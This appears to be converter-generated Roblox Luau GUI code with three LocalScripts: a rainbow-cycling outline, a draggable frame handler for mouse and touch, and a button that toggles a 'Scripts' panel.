-- StarterGui.ScreenGui.Frame.LocalScript
local function C_4()
local script = G2L["4"];
	local stroke = script.Parent:FindFirstChild("UIStroke")
	local hue = 0
	
	while true do
		hue = (hue + 1) % 360
		stroke.Color = Color3.fromHSV(hue / 360, 1, 1)
		wait(0.0005) -- adjust speed here
	end
end;
task.spawn(C_4);
-- StarterGui.ScreenGui.Frame.Dragify
local function C_d()
local script = G2L["d"];
	local frame = script.Parent
	local UIS = game:GetService("UserInputService")
	
	local dragging = false
	local dragStart = nil
	local startPos = nil
	
	-- When mouse or touch begins
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
		end
	end)
	
	-- When mouse or touch ends
	frame.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
	
	-- Update position while dragging
	UIS.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)
end;
task.spawn(C_d);
-- StarterGui.ScreenGui.Frame.Btn.LocalScript
local function C_12()
local script = G2L["12"];
	script.Parent.MouseButton1Click:Connect(function()
		local frame = script.Parent.Parent:FindFirstChild("Scripts")
		if frame then
			frame.Visible = not frame.Visible
		end
	end)
end;
task.spawn(C_12);
